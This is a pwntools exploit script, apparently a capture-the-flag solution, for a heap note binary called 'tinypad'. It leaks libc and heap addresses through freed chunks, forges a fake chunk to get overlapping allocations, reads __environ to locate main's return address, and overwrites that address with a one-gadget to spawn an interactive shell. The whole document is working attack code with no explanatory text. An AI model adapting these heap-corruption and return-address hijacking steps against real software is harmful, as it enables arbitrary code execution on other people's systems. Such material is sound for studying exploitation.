from pwn import *
p = process("./tinypad")
e = ELF("./tinypad")
libc = ELF("/libc64.so.6")

count = 0


def add(size, content):
    p.recvuntil('(CMD)>>> ')
    p.sendline('a')
    p.recvuntil('(SIZE)>>> ')
    p.sendline(str(size))
    p.recvuntil('(CONTENT)>>> ')
    p.sendline(content)


def edit(idx, content):
    p.recvuntil('(CMD)>>> ')
    p.sendline('e')
    p.recvuntil('(INDEX)>>> ')
    p.sendline(str(idx))
    p.recvuntil('(CONTENT)>>> ')
    p.sendline(content)
    p.recvuntil('Y/n)>>> ')
    p.sendline('Y')


def delete(idx):
    p.recvuntil('(CMD)>>> ')
    p.sendline('d')
    p.recvuntil('(INDEX)>>> ')
    p.sendline(str(idx))


def get(idx, len=6):
    p.recvuntil("INDEX: {}".format(str(idx)))
    p.recvuntil("CONTENT: ")
    return u64(p.recvuntil('\n', drop=True).ljust(8, '\x00'))


target_addr = 0x601f82 - 8
tinypad_buf = 0x602040
add(0xe8, '1' * 0xe0)
edit(1, '\x00' * 0xd8 + p64(0x50))
add(0xe8, '2')
delete(1)
libc_base = get(1) - 88 - 0X3C4B20
print "libc base: " + hex(libc_base)
libc_system = libc_base + libc.symbols['system']

delete(2)
add(0x48, '1')
add(0x48, '2')
delete(2)
delete(1)
heap_base = get(1, 4) - 0x50
print "heap base: " + hex(heap_base)

fake_chunk = p64(0) + p64(0x90) + p64(heap_base + 0x10) * 2
add(0x48, fake_chunk)
add(0x48, '2')
add(0x100 - 8, '3')
add(0x10, '4')
delete(2)
add(0x48, p64(0) * 8 + p64(0x90))
delete(3)
delete(2)
add(0x100 - 8, p64(0) * 7 + p64(0x51) + p64(tinypad_buf + 208))
delete(4)
add(0x48, '3')
#context.log_level = 'debug'
environ_point = libc_base + libc.symbols['__environ']
add(
    0x48,
    p64(0) * 4 + p64(0x10) + p64(environ_point) + p64(8) +
    p64(tinypad_buf + 256 + 8))
main_return_addr = get(1) - 30 * 8
print "main return address in: " + hex(main_return_addr)
edit(2, p64(main_return_addr))
#add(0x48, p64(0) * 4 + p64(0x8) + p64(main_return_addr))
edit(1, p64(libc_base + 0xf1147))
p.recvuntil('(CMD)>>> ')
p.sendline('q')
context.log_level = 'debug'
p.recv()
p.interactive()
